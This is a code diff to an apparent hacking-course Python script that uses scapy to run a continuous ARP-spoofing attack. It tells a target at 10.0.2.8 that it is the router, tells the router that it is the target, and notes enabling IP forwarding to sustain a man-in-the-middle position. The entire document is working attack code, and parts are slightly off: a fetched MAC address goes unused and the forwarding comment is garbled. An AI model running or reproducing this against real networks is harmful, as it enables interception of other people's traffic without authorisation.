@@ -22,6 +22,7 @@
 #																			***these fields can be found using network_scanner.py from previous lecture for all devices in network
 
 import scapy.all as scapy
+import time
 
 def get_mac(ip):	#modified scan function from network_scanner.py
 
@@ -38,9 +39,16 @@ def get_mac(ip):	#modified scan function from network_scanner.py
 	answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # srp function will send the packet to broadcast MAC address and check all IPs provided by ip.
 	return (answered_list[0][1].hwsrc)
 
-def spoof(target_ip,spoof_ip)
+def spoof(target_ip , spoof_ip):
 	target_mac = get_mac(target_ip)
 	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "08:00:27:e6:e5:59", psrc = spoof_ip)
-	scapy.send(packet)
+	scapy.send(packet, verbose = False)
 
-spoof("10.0.2.8","10.0.2.1")
+packets_sent = 0
+while True:
+	spoof("10.0.2.8","10.0.2.1")	#tell target we are the router
+	spoof("10.0.2.1","10.0.2.8")	#tell router we are the target
+	packets_sent += 2
+	print("[+] Sent "+str(packets_sent)+" packets")
+	time.sleep(2)
+	#echo > 1 /proc/sys/net/ipv4/ip_forward to enable ip forwarding (so target can still use internet)
